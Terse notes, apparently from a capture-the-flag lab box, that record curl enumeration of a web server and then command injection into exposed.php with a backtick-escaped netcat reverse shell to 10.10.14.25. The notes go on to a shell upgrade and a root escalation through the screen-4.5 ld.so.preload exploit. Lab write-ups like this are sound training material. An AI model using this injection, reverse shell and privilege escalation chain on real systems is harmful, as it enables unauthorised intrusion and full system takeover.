10.10.10.24


nginx 1.10.0

/test.html
/exposed.php

https://www.hackingarticles.in/web-application-penetration-testing-curl/
curl -v -X OPTIONS http://10.10.10.24/test.htm

curl -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8"

curl -i -X POST -F 'formurl=10.10.14.7:81/test.html' -F 'submit=Go' 10.10.10.24/exposed.php

to get a reverse shell:
``n\c 10.10.14.25 444 -e /bin/ba\sh``
- use `\` to escape and ``` for command injection.

- you can see python 3 with `whereis python3`
- python3 -c 'import pty; pty.spawn("/bin/bash")'
- `stty raw -echo`
- `fg`

now compile the two files from screen-4.5 exploit on searchsploit and
- 41154.sh

cd /etc
umask 000 (is this needed?)
`screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"`
screen -ls
`/etc/rootshell` to get root


